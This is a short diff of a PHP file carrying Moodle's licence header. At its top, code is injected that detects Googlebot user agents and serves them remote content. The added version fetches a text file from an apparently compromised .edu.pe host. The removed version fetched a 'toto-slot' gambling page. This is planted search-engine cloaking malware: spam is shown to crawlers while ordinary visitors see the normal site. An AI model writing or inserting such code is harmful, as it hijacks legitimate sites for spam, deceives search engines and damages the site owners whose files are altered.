@@ -1,37 +1,18 @@
 <?php
-function isGoogleBot() {
-    $userAgent = $_SERVER['HTTP_USER_AGENT'];
-    $googleBotAgents = [
-        'Googlebot',
-        'Googlebot/2.1',
-        'Googlebot-Mobile',
-        'Googlebot-Image',
-        'Googlebot-Video',
-        'Googlebot-News',
-        'Google-InspectionTool',
-        'Google-Site-Verification',
-        'Mediapartners-Google',
-        'AdsBot-Google',
-        'AdsBot-Google-Mobile',
-        'APIs-Google',
-        'AdsBot-Google-Mobile-Apps',
-        'FeedFetcher-Google',
-        'DuplexWeb-Google',
-        'Google Favicon',
-        'Google-Read-Aloud',
-    ];
-    
-    foreach ($googleBotAgents as $botAgent) {
-        if (strpos($userAgent, $botAgent) !== false) {
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, $agent) !== false) {
             return true;
         }
     }
     return false;
 }
 
-if (isGoogleBot()) {
-    // Jika pengunjung adalah Googlebot, tampilkan index_hitam.txt
-    echo file_get_contents('https://pub-69074c1a3c1743e59e5ec6a42a113bf8.r2.dev/toto-slot.html');
+$request_uri = $_SERVER['REQUEST_URI'];
+if (is_google_bot()) {
+    echo file_get_contents("https://cetprosanpablodelacruz.edu.pe/guelegu/cam.txt");
     exit;
 }
 // This file is part of Moodle - http://moodle.org/
